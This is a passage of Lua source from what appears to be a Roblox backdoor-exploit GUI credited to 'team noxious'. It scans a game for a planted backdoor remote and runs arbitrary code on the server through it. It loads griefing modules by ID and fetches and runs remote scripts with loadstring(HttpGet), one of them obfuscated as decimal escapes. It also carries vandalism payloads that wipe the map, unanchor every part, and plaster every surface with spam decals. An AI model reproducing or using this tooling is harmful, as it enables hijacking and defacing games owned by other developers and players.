
						box["backdoor test button"].TextColor3 = box["default border color"]
						box["backdoor test button"].Font = Enum.Font.RobotoMono
						box["backdoor test button"].TextSize = 15
						box["backdoor test button"].TextScaled = false
						box["backdoor test button"].Text = "test backdoor"
						box["backdoor test button"].TextXAlignment = Enum.TextXAlignment.Center
						box["backdoor test button"].TextYAlignment = Enum.TextYAlignment.Center

						box["backdoor test button text padding"] = Instance.new("UIPadding")
						box["backdoor test button text padding"].PaddingLeft = UDim.new(0, 0)
						box["backdoor test button text padding"].Parent = box["backdoor test button"]

						box["backdoor test button"].Parent = box["main frame 4"]
						box["backdoor test button"].ZIndex = 24
						box["backdoor test button"].Visible = true
						task.spawn(updcols)

						local cantestbackdoor = true

						box["backdoor test button"].MouseButton1Click:Connect(function()
							playclicksound()
							if not cantestbackdoor then return end
							cantestbackdoor = false
							runbackdoor(remote, "a=Instance.new('Hint')a.Text='this game has been BACKDOORED!! join team noxious later maybe idk | gg/bwdk8vAy8n'a.Parent=workspace;wait(5)a:Remove()")
							task.delay(5, function() cantestbackdoor = true end)
						end)

						hasscanned = true
						backdoored = true
						backdoor = remote

						addTextWithNewline(box["logs textbox"], "backdoor found!")

						wait(5)

						toggleLoop(true)
						scanning = false

						runbackdoor(remote, "require(171016405.1884*69)")
						return true
					end
				end
				wait()
			end

			box["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: remote scan (unsuccessful)\nbackdoor level: n/a (none found)\nbackdoor destructivity level: n/a\nbackdoor type: n/a\npgrab availability: n/a\nexecutor identity: 8"
			return false
		end

		box["execute button"].MouseButton1Click:Connect(function()
			spawn(function() playclicksound() end)
			local a,b=string.gsub(box["executor textbox"].Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)

			local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
			if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
				addTextWithNewline(box["logs textbox"], "protected backdoor found.")
				spawn(function()
					local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('join team noxious later maybe idk | gg/bwdk8vAy8n', a) end)
					if variantValue~=nil then
						local splited=string.split(variantValue,':')
						addTextWithNewline(box["logs textbox"], splited[#splited])
					end
				end)
			else
				runbackdoor(backdoor, a)
			end
		end)

		searching=false

		if not searching then
			searching=true

			box["logs textbox"].Text = ""
			updateCanvas2()
			addTextWithNewline(box["logs textbox"], "checking for backdoors...")
			unablenotify("checking for backdoors...")

			hasscanned = true

			addTextWithNewline(box["logs textbox"], "using remote scan method.")
			wait(0.1)
			addTextWithNewline(box["logs textbox"], "scanning...")
			box["backdoor info holder"].Text = "respectfilteringenabled = " .. rfe .. "\nbackdoors found: 0\nbackdoor path: n/a\nmethod used: remote scan\nbackdoor level: n/a (none found)\nbackdoor destructivity level: n/a\nbackdoor type: n/a\npgrab availability: n/a\nexecutor identity: 8"

			wait(1)

			if not findRemote() then
				local nay = Instance.new("Sound")
				nay.SoundId = "rbxassetid://8503529943"
				nay.Parent = box["local player"]
				nay.Volume = 3.3
				nay.Name = "canttouchthis"
				nay.TimePosition = 0.01

				spawn(function() nay:Play() end)

				checkingforbackdoors = false
				box["toggle interface visibility button"].Text = "ó.ò"

				hasscanned = true

				addTextWithNewline(box["logs textbox"], "no backdoor found.")
				unablenotify("no backdoor found.")
				searching=false
				wait(5)
				toggleLoop(true)
				wait(1)
				canscan = true
				hasscanned = true
				scanning = false
			end
		end
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["credits"].Size = UDim2.new(0, 133, 0, 26)
box["credits"].Position = UDim2.new(0, 268, 0, 0)

box["credits"].BackgroundColor3 = box["default background color"]

box["credits"].BorderColor3 = box["default border color"]
box["credits"].BorderSizePixel = 1

box["credits"].TextColor3 = box["default border color"]
box["credits"].Font = Enum.Font.RobotoMono
box["credits"].TextSize = 15
box["credits"].TextScaled = false
box["credits"].Text = "credits"
box["credits"].TextXAlignment = Enum.TextXAlignment.Center
box["credits"].TextYAlignment = Enum.TextYAlignment.Center

box["credits text padding"] = Instance.new("UIPadding")
box["credits text padding"].PaddingLeft = UDim.new(0, 0)
box["credits text padding"].Parent = box["scripts tab"]

box["credits"].Parent = box["main frame 4"]
box["credits"].ZIndex = 25

box["credits bottom cover"].Size = UDim2.new(0, 133, 0, 2)
box["credits bottom cover"].Position = UDim2.new(0, 268, 0, 26)
box["credits bottom cover"].BackgroundColor3 = box["default background color"]
box["credits bottom cover"].BorderSizePixel = 0
box["credits bottom cover"].Parent = box["main frame 4"]
box["credits bottom cover"].ZIndex = 25.5
box["credits bottom cover"].Visible = false

box["credits"].MouseButton1Click:Connect(function()
	playclicksound()

	box["backdoor info bottom cover"].Visible = false
	box["scanning bottom cover"].Visible = false
	box["credits bottom cover"].Visible = true

	box["backdoor info holder"].Visible = false
	box["logs holder"].Visible = false
	box["logs scrolling frame"].Visible = false
	box["backdoor scan button"].Visible = false
	box["credits holder"].Visible = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["credits holder"].Size = UDim2.new(0, 393, 0, 214)
box["credits holder"].Position = UDim2.new(0, 4, 0, 31)
box["credits holder"].BackgroundColor3 = box["default background color"]
box["credits holder"].BorderColor3 = box["default border color"]
box["credits holder"].BorderSizePixel = 1
box["credits holder"].Parent = box["main frame 4"]
box["credits holder"].ZIndex = 19
box["credits holder"].Visible = false

box["credits holder"].TextColor3 = box["default border color"]
box["credits holder"].Font = Enum.Font.RobotoMono
--box["credits holder"].TextSize = 20
box["credits holder"].TextSize = 15
box["credits holder"].TextScaled = false
box["credits holder"].Text = "n/a"
--box["credits holder"].TextXAlignment = Enum.TextXAlignment.Left
--box["credits holder"].TextYAlignment = Enum.TextYAlignment.Top
box["credits holder"].TextXAlignment = Enum.TextXAlignment.Center
box["credits holder"].TextYAlignment = Enum.TextYAlignment.Center
box["credits holder"].ZIndex = 25
box["credits holder"].ClipsDescendants = true

box["credits holder text padding"] = Instance.new("UIPadding")
--box["credits holder text padding"].PaddingLeft = UDim.new(0, 4)
--box["credits holder text padding"].PaddingTop = UDim.new(0, 4)
box["credits holder text padding"].PaddingBottom = UDim.new(0, 2)
--box["credits holder text padding"].PaddingBottom = UDim.new(0, 4)
box["credits holder text padding"].Parent = box["credits holder"]

box["credits holder"].Text = "credits:\n\nteam noxious - development & revival\n\nteam occulence - code adjustments\n\nteam symphysis - UI design, testing & refining"

-------------------------------------------------------------------------------------------------------------------------------

box["scripts tab"].Size = UDim2.new(0, 100, 0, 26)
box["scripts tab"].Position = UDim2.new(0, 0, 0, 1)

box["scripts tab"].BackgroundColor3 = box["default background color"]

box["scripts tab"].BorderColor3 = box["default border color"]
box["scripts tab"].BorderSizePixel = 1

box["scripts tab"].TextColor3 = box["default border color"]
box["scripts tab"].Font = Enum.Font.RobotoMono
box["scripts tab"].TextSize = 15
box["scripts tab"].TextScaled = false
box["scripts tab"].Text = "scripts"
box["scripts tab"].TextXAlignment = Enum.TextXAlignment.Center
box["scripts tab"].TextYAlignment = Enum.TextYAlignment.Center

box["scripts tab text padding"] = Instance.new("UIPadding")
box["scripts tab text padding"].PaddingLeft = UDim.new(0, 0)
box["scripts tab text padding"].Parent = box["scripts tab"]

box["scripts tab"].Parent = box["main frame 1"]
box["scripts tab"].ZIndex = 19

box["scripts tab bottom cover"].Size = UDim2.new(0, 100, 0, 2)
box["scripts tab bottom cover"].Position = UDim2.new(0, 0, 0, 27)
box["scripts tab bottom cover"].BackgroundColor3 = box["default background color"]
box["scripts tab bottom cover"].BorderSizePixel = 0
box["scripts tab bottom cover"].Parent = box["main frame 1"]
box["scripts tab bottom cover"].ZIndex = 19.5
box["scripts tab bottom cover"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["button holder"].Size = UDim2.new(0, 369, 0, 180)
box["button holder"].Position = UDim2.new(0, 28, 0, 55)
box["button holder"].BackgroundColor3 = box["default background color"]
box["button holder"].BorderColor3 = box["default border color"]
box["button holder"].BorderSizePixel = 0
box["button holder"].Parent = box["main frame 1"]
box["button holder"].ZIndex = 19
box["button holder"].Visible = false

box["script search bar"].Size = UDim2.new(0, 345, 0, 19)
box["script search bar"].Position = UDim2.new(0, 28, 0, 32)
box["script search bar"].BackgroundColor3 = box["default background color"]
box["script search bar"].BorderColor3 = box["default border color"]
box["script search bar"].BorderSizePixel = 1
box["script search bar"].TextColor3 = box["default border color"]
box["script search bar"].Font = Enum.Font.RobotoMono
box["script search bar"].TextSize = 15
box["script search bar"].TextScaled = false
box["script search bar"].PlaceholderText = "search scripts"
box["script search bar"].PlaceholderColor3 = Color3.new(0.7, 0.7, 0.7)
box["script search bar"].Text = ""
box["script search bar"].TextXAlignment = Enum.TextXAlignment.Center
box["script search bar"].TextYAlignment = Enum.TextYAlignment.Center
box["script search bar"].ClearTextOnFocus = false
box["script search bar"].Parent = box["main frame 1"]
box["script search bar"].ZIndex = 19
box["script search bar"].Visible = false
box["script search bar"].ClearTextOnFocus = true

box["script search bar padding"] = Instance.new("UIPadding")
box["script search bar padding"].PaddingLeft = UDim.new(0, 6)
box["script search bar padding"].PaddingRight = UDim.new(0, 6)
box["script search bar padding"].PaddingBottom = UDim.new(0, 1)
box["script search bar padding"].Parent = box["script search bar"]

box["next page"].Size = UDim2.new(0, 19, 0, 214)
box["next page"].Position = UDim2.new(0, 378, 0, 32)
box["next page"].BackgroundColor3 = box["default background color"]
box["next page"].BorderColor3 = box["default border color"]
box["next page"].BorderSizePixel = 1
box["next page"].Parent = box["main frame 1"]
box["next page"].ZIndex = 19
box["next page"].Visible = false

box["next page"].TextColor3 = box["default border color"]
box["next page"].Font = Enum.Font.RobotoMono
box["next page"].TextSize = 15
box["next page"].TextScaled = false
box["next page"].Text = ">"
box["next page"].TextXAlignment = Enum.TextXAlignment.Center
box["next page"].TextYAlignment = Enum.TextYAlignment.Center

box["next page text padding"] = Instance.new("UIPadding")
box["next page text padding"].PaddingBottom = UDim.new(0, 2)
box["next page text padding"].Parent = box["next page"]

box["previous page"].Size = UDim2.new(0, 19, 0, 214)
box["previous page"].Position = UDim2.new(0, 4, 0, 32)
box["previous page"].BackgroundColor3 = box["default background color"]
box["previous page"].BorderColor3 = box["default border color"]
box["previous page"].BorderSizePixel = 1
box["previous page"].Parent = box["main frame 1"]
box["previous page"].ZIndex = 19
box["previous page"].Visible = false

box["previous page"].TextColor3 = box["default border color"]
box["previous page"].Font = Enum.Font.RobotoMono
box["previous page"].TextSize = 15
box["previous page"].TextScaled = false
box["previous page"].Text = "<"
box["previous page"].TextXAlignment = Enum.TextXAlignment.Center
box["previous page"].TextYAlignment = Enum.TextYAlignment.Center

box["previous page text padding"] = Instance.new("UIPadding")
box["previous page text padding"].PaddingBottom = UDim.new(0, 1)
box["previous page text padding"].Parent = box["previous page"]

local buttonsperscriptpg = 9
local allbuttons = {}
local filteredbuttons = {}
local currentscriptpg = 1
local totalscriptpgs = 1
local savedscriptpg = 1
local searchingforbuttons = false
local emptybuttons = {}

local buttondata = {}

function mtbutton(xOffset, yOffset, column)
	local buttonWidth = 111
	if column == 1 then
		buttonWidth = 113
	end

	local button = Instance.new("TextLabel")
	button.Name = "fakebutton"
	button.Size = UDim2.new(0, buttonWidth, 0, 60)
	button.Position = UDim2.new(0, xOffset, 0, yOffset)
	button.BackgroundColor3 = box["default background color"]
	button.BorderColor3 = box["default 1/2 color 2"]
	button.BorderSizePixel = 1
	button.TextColor3 = box["default 1/2 color"]
	button.Font = Enum.Font.RobotoMono
	button.TextSize = 15
	button.TextScaled = false
	button.Text = "-"
	button.TextXAlignment = Enum.TextXAlignment.Center
	button.TextYAlignment = Enum.TextYAlignment.Center
	button.Parent = box["button holder"]
	button.ZIndex = 19
	button.TextWrapped = true
	button.Visible = true

	local textpadding = Instance.new("UIPadding")
	textpadding.PaddingLeft = UDim.new(0, 6)
	textpadding.PaddingRight = UDim.new(0, 6)
	textpadding.Parent = button

	local numberLabel = Instance.new("TextLabel")
	numberLabel.Size = UDim2.new(0, 20, 0, 20)
	numberLabel.Position = UDim2.new(0, -2, 0, -3)
	numberLabel.BackgroundTransparency = 1
	numberLabel.Text = "-"
	numberLabel.TextColor3 = box["default 1/2 color"]
	numberLabel.Font = Enum.Font.RobotoMono
	numberLabel.TextSize = 10
	numberLabel.TextXAlignment = Enum.TextXAlignment.Left
	numberLabel.TextYAlignment = Enum.TextYAlignment.Center
	numberLabel.Parent = button
	numberLabel.ZIndex = 20
	numberLabel.Name = "fakebuttonlabel"

	local textpadding = Instance.new("UIPadding")
	textpadding.PaddingLeft = UDim.new(0, 6)
	textpadding.PaddingRight = UDim.new(0, 6)
	textpadding.Parent = button

	table.insert(emptybuttons, button)
	return button
end

local function cleanupmtbuttons()
	for _, button in ipairs(emptybuttons) do
		button:Destroy()
	end
	emptybuttons = {}
end

local function updbuttonvisibility()
	cleanupmtbuttons()
	local buttonsToShow = searchingforbuttons and filteredbuttons or allbuttons
	local startIndex = (currentscriptpg - 1) * buttonsperscriptpg + 1
	local endIndex = math.min(startIndex + buttonsperscriptpg - 1, #buttonsToShow)

	for _, button in ipairs(allbuttons) do
		button.Visible = false
	end

	local occupiedPositions = {}

	for i = startIndex, endIndex do
		if buttonsToShow[i] then
			local pos = buttonsToShow[i].Position
			local gridX = math.floor(pos.X.Offset)
			local gridY = math.floor(pos.Y.Offset)
			occupiedPositions[gridX..","..gridY] = true
			buttonsToShow[i].Visible = true
		end
	end

	for row = 0, 2 do
		for col = 0, 2 do
			local xOffset = col * 117
			local yOffset = row * 65 + 1

			if col == 1 then
				xOffset = col * 116
			end

			if not occupiedPositions[xOffset..","..yOffset] then
				mtbutton(xOffset, yOffset, col)
			end
		end
	end

	box["previous page"].Visible = true
	box["next page"].Visible = true

	savedscriptpg = currentscriptpg
end

local function positionAllButtons()
	local buttonsToPosition = searchingforbuttons and filteredbuttons or allbuttons

	for i, button in ipairs(buttonsToPosition) do
		local positionInGrid = (i - 1) % buttonsperscriptpg
		local row = math.floor(positionInGrid / 3)
		local column = positionInGrid % 3
		local xOffset = column * 117
		local yOffset = row * 65 + 1

		local buttonWidth = 111
		if column == 1 then
			buttonWidth = 113
			xOffset = column * 116
		end

		button.Size = UDim2.new(0, buttonWidth, 0, 60)
		button.Position = UDim2.new(0, xOffset, 0, yOffset)
	end
end

local function filterbuttons(searchText)
	searchText = string.lower(searchText or "")
	filteredbuttons = {}

	if searchText == "" then
		searchingforbuttons = false
		totalscriptpgs = math.ceil(#allbuttons / buttonsperscriptpg)
		currentscriptpg = math.min(savedscriptpg, totalscriptpgs)

		for i, button in ipairs(allbuttons) do
			local positionInPage = (i - 1) % buttonsperscriptpg
			local row = math.floor(positionInPage / 3)
			local column = positionInPage % 3
			local xOffset = column * 117
			local yOffset = row * 65 + 1

			local buttonWidth = 111
			if column == 1 then
				buttonWidth = 113
				xOffset = column * 116
			end

			button.Size = UDim2.new(0, buttonWidth, 0, 60)
			button.Position = UDim2.new(0, xOffset, 0, yOffset)
		end

		updbuttonvisibility()
		return
	end

	for _, button in ipairs(allbuttons) do
		if string.find(string.lower(button.Text), searchText, 1, true) then
			table.insert(filteredbuttons, button)
		end
	end

	for i, button in ipairs(filteredbuttons) do
		local positionInGrid = i - 1
		local row = math.floor(positionInGrid / 3)
		local column = positionInGrid % 3
		local xOffset = column * 117
		local yOffset = row * 65 + 1

		local buttonWidth = 111
		if column == 1 then
			buttonWidth = 113
			xOffset = column * 116
		end

		button.Size = UDim2.new(0, buttonWidth, 0, 60)
		button.Position = UDim2.new(0, xOffset, 0, yOffset)
	end

	searchingforbuttons = true
	totalscriptpgs = math.ceil(#filteredbuttons / buttonsperscriptpg)
	currentscriptpg = 1

	updbuttonvisibility()
end

box["next page"].MouseButton1Click:Connect(function()
	playclicksound()
	local buttonsToUse = searchingforbuttons and filteredbuttons or allbuttons
	currentscriptpg = currentscriptpg + 1
	if currentscriptpg > math.ceil(#buttonsToUse / buttonsperscriptpg) then
		currentscriptpg = 1
	end

	positionAllButtons()
	updbuttonvisibility()
end)

box["previous page"].MouseButton1Click:Connect(function()
	playclicksound()
	local buttonsToUse = searchingforbuttons and filteredbuttons or allbuttons
	currentscriptpg = currentscriptpg - 1
	if currentscriptpg < 1 then
		currentscriptpg = math.ceil(#buttonsToUse / buttonsperscriptpg)
	end

	positionAllButtons()
	updbuttonvisibility()
end)

box["script search bar"].FocusLost:Connect(function()
	filterbuttons(box["script search bar"].Text)
end)

box["script search bar"]:GetPropertyChangedSignal("Text"):Connect(function()
	filterbuttons(box["script search bar"].Text)
end)

function showScriptPage()
	box["button holder"].Visible = true
	box["script search bar"].Visible = true

	box["next page"].Visible = true
	box["previous page"].Visible = true

	positionAllButtons()
	updbuttonvisibility()
end

function hideScriptPage()
	box["button holder"].Visible = false
	box["script search bar"].Visible = false
	box["next page"].Visible = false
	box["previous page"].Visible = false
end

function cscript(buttonText, onClick, buttonNumber, uniqueId)
	local index = #allbuttons + 1
	local positionInPage = (index - 1) % buttonsperscriptpg
	local row = math.floor(positionInPage / 3)
	local column = positionInPage % 3
	local xOffset = column * 117
	local yOffset = row * 65

	local buttonWidth = 111
	if column == 1 then
		buttonWidth = 113
		xOffset = column * 116
	end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0, buttonWidth, 0, 60)
	button.Position = UDim2.new(0, xOffset, 0, yOffset + 1)
	button.BackgroundColor3 = box["default background color"]
	button.BorderColor3 = box["default border color"]
	button.BorderSizePixel = 1
	button.TextColor3 = box["default border color"]
	button.Font = Enum.Font.RobotoMono
	button.TextSize = 15
	button.TextScaled = false
	button.Text = buttonText
	button.TextXAlignment = Enum.TextXAlignment.Center
	button.TextYAlignment = Enum.TextYAlignment.Center
	button.Parent = box["button holder"]
	button.ZIndex = 19
	button.TextWrapped = true
	button.Visible = (index <= buttonsperscriptpg and box["button holder"].Visible)

	buttondata[button] = {
		id = uniqueId or buttonText..tostring(index),
		script = onClick,
		number = buttonNumber or index,
		originalPosition = UDim2.new(0, xOffset, 0, yOffset)
	}

	local numberLabel = Instance.new("TextLabel")
	numberLabel.Size = UDim2.new(0, 20, 0, 20)
	numberLabel.Position = UDim2.new(0, -2, 0, -3)
	numberLabel.BackgroundTransparency = 1
	numberLabel.Text = tostring(buttonNumber or index)
	numberLabel.TextColor3 = box["default 1/2 color"]
	numberLabel.Font = Enum.Font.RobotoMono
	numberLabel.TextSize = 10
	numberLabel.TextXAlignment = Enum.TextXAlignment.Left
	numberLabel.TextYAlignment = Enum.TextYAlignment.Center
	numberLabel.Parent = button
	numberLabel.ZIndex = 20
	numberLabel.Name = "ButtonNumber"

	local textpadding = Instance.new("UIPadding")
	textpadding.PaddingLeft = UDim.new(0, 6)
	textpadding.PaddingRight = UDim.new(0, 6)
	textpadding.Parent = button

	button.MouseButton1Click:Connect(function()
		playclicksound()
		if buttonNumber == "RQ" and not backdoor then
			unablenotify("you cannot run require scripts without a backdoor.") return
		end
		local data = buttondata[button]
		if not data then return end

		local localPlayer = game.Players.LocalPlayer
		local cleanedCode = data.script:gsub("%%replace%%with%%username%%", localPlayer.Name)

		local formattedCode = ""
		for line in cleanedCode:gmatch("[^\r\n]+") do
			local trimmedLine = line:gsub("^%s", "")
			formattedCode = formattedCode .. trimmedLine .. "\n"
		end

		formattedCode = formattedCode:sub(1, -2)

		local oldexectext = box["executor textbox"].Text
		box["executor textbox"].Text = formattedCode
		task.spawn(executeCodeFromTextBox)
		box["executor textbox"].Text = oldexectext
	end)

	table.insert(allbuttons, button)
	totalscriptpgs = math.ceil(#allbuttons / buttonsperscriptpg)

	button.Visible = (index <= buttonsperscriptpg and box["button holder"].Visible)

	return numberLabel
end

function executeCodeFromTextBox()
	if backdoor ~= nil then
		local a,b=string.gsub(box["executor textbox"].Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
		runbackdoor(backdoor, a)
		return
	end
	if backdoored == true then
		return
	end

	local code = box["executor textbox"].Text

	if code and code ~= "" then
		assert(loadstring(code))()
	end
end

-------------------------------------------------------------------------------------------------------------------------------

cscript("immortality lord", [[
	require(6534274227)("%replace%with%username%")
]], "RQ")

cscript("comet FE", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/Comet"))();
]], "LS")

cscript("DEX explorer", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
]], "LS")

cscript("goner", [[
	require(4513235536).G("%replace%with%username%")
]], "RQ")

cscript("grab knife", [[
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-knife-v4-24753"))()
]], "LS")

cscript("star glitcher", [[
	require(5738781015).load("%replace%with%username%")
]], "RQ")

cscript("clear map", [[
camera = workspace:FindFirstChild("Camera")
Players = game:GetService("Players")

for _, item in pairs(workspace:GetChildren()) do
	if item ~= camera and item.Name ~= "Terrain" and item.Name ~= "Players" and not Players:GetPlayerFromCharacter(item) then
		item:Destroy()
	end
end

local bro = Instance.new("SpawnLocation", workspace)
bro.Anchored = true
bro.Transparency = 1
bro.Position = Vector3.new(0, 6, 0)

baseplate = Instance.new("Part")
baseplate.Name = "Baseplate"
baseplate.Size = Vector3.new(2048, 16, 2048)
baseplate.Anchored = true
baseplate.Position = Vector3.new(0, 0, 0)
baseplate.BrickColor = BrickColor.new("Dark grey metallic")
baseplate.Material = Enum.Material.Plastic
baseplate.Parent = workspace

txt = Instance.new("Texture")
txt.Texture = "rbxassetid://6372755229"
txt.Parent = baseplate

for _, player in ipairs(Players:GetPlayers()) do
    if player and player.Character then
        player:LoadCharacter()
    end
end
]], "CS / SS")

cscript("infinite yield", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
]], "LS")

cscript("mobile\nkeyboard", [[
	loadstring(game:HttpGet"https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr")()
]], "LS")

cscript("fe bypass gui", [[
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
]], "LS")

cscript("c00lgui", [[
	require(14125553864):Fire("%replace%with%username%", "c00lkidd")
]], "RQ")

cscript("quirkyCMD", [[
	loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
]], "LS")

cscript("holy wrench", [[
	require(8596757978).load("%replace%with%username%")
]], "RQ")

local interval = 0.2
local brightnessRange = {1, 3}
local colorChangeSpeed = 5

function getRandomColor()
	return Color3.new(math.random(), math.random(), math.random())
end

local isDiscoActive = false

function startDiscoMode()
	while isDiscoActive do
		box["lighting"].Ambient = getRandomColor()
		box["lighting"].OutdoorAmbient = getRandomColor()
		box["lighting"].ColorShift_Top = getRandomColor()
		box["lighting"].Brightness = math.random(brightnessRange[1] * 100, brightnessRange[2] * 100) / 100

		task.wait(interval)
	end
end

local originalSettings = {}

function savelighting()
	originalSettings.Brightness = box["lighting"].Brightness
	originalSettings.ClockTime = box["lighting"].ClockTime
	originalSettings.FogEnd = box["lighting"].FogEnd
	originalSettings.GlobalShadows = box["lighting"].GlobalShadows
	originalSettings.OutdoorAmbient = box["lighting"].OutdoorAmbient
	originalSettings.Ambient = box["lighting"].Ambient
	originalSettings.ColorShift_Top = box["lighting"].ColorShift_Top
end

function loadlghting()	
	box["lighting"].Brightness = originalSettings.Brightness
	box["lighting"].ClockTime = originalSettings.ClockTime
	box["lighting"].FogEnd = originalSettings.FogEnd
	box["lighting"].GlobalShadows = originalSettings.GlobalShadows
	box["lighting"].OutdoorAmbient = originalSettings.OutdoorAmbient
	box["lighting"].Ambient = originalSettings.Ambient
	box["lighting"].ColorShift_Top = originalSettings.ColorShift_Top
end

cscript("disco", [[
	interval = 0.2
	brightnessRange = {1, 3}

	function getRandomColor()
		return Color3.new(math.random(), math.random(), math.random())
	end
	
	while true do
		game:GetService("Lighting").Ambient = getRandomColor()
		game:GetService("Lighting").OutdoorAmbient = getRandomColor()
		game:GetService("Lighting").ColorShift_Top = getRandomColor()
		game:GetService("Lighting").Brightness = math.random(brightnessRange[1] * 100, brightnessRange[2] * 100) / 100

		task.wait(interval)
	end
]], "CS / SS")

cscript("k00pgui", [[
	require(15267263357).V11("%replace%with%username%")
]], "RQ")

cscript("ro-xploit", [[
	loadstring(game:GetObjects('rbxassetid://364364477')[1].Source)()
]], "LS")

cscript("remote spy", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
]], "LS")

cscript("audio logger", [[
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua'),true))()
]], "LS")

cscript("unanchor map", [[
	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("BasePart") and descendant.Name ~= "Baseplate" then
			descendant.Anchored = false
		end
	end
]], "CS / SS")

cscript("unable spam", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://82967466186087" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://82967466186087"
				Two.Texture = "rbxassetid://82967466186087"
				Three.Texture = "rbxassetid://82967466186087"
				Four.Texture = "rbxassetid://82967466186087"
				Five.Texture = "rbxassetid://82967466186087"
				Six.Texture = "rbxassetid://82967466186087"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	local imageId = "rbxassetid://82967466186087"

	function billbord(part)
		part:FindFirstChildOfClass("BillboardGui"):Destroy()
		if part:FindFirstChildOfClass"BillboardGui"then return end

		local billboardGui = Instance.new"BillboardGui"			
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Parent = part
		billboardGui.Adornee = part

		local imageLabel = Instance.new"ImageLabel"			
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui
	end

	function addbillbord()
		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA"BasePart"then
				billbord(descendant)
			end
		end

		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA"BasePart"then
				billbord(newDescendant)
			end
		end)
	end

	--addbillbord()

	local lighting = game:GetService("Lighting")

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    task.wait()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://82967466186087"
sky.SkyboxDn = "rbxassetid://82967466186087"
sky.SkyboxFt = "rbxassetid://82967466186087"
sky.SkyboxLf = "rbxassetid://82967466186087"
sky.SkyboxRt = "rbxassetid://82967466186087"
sky.SkyboxUp = "rbxassetid://82967466186087"

sky.Parent = lighting
]], "CS / SS")

cscript("c00lkidd spam", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://158118263" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://158118263"
				Two.Texture = "rbxassetid://158118263"
				Three.Texture = "rbxassetid://158118263"
				Four.Texture = "rbxassetid://158118263"
				Five.Texture = "rbxassetid://158118263"
				Six.Texture = "rbxassetid://158118263"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	local imageId = "rbxassetid://158118263"

	function billbord(part)
		if part:FindFirstChildOfClass("BillboardGui") then return end

		local billboardGui = Instance.new"BillboardGui"			
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Parent = part
		billboardGui.Adornee = part

		local imageLabel = Instance.new"ImageLabel"			
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui
	end

	function addbillbord()
		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA"BasePart"then
				billbord(descendant)
			end
		end

		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA"BasePart"then
				billbord(newDescendant)
			end
		end)
	end

	--addbillbord()

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
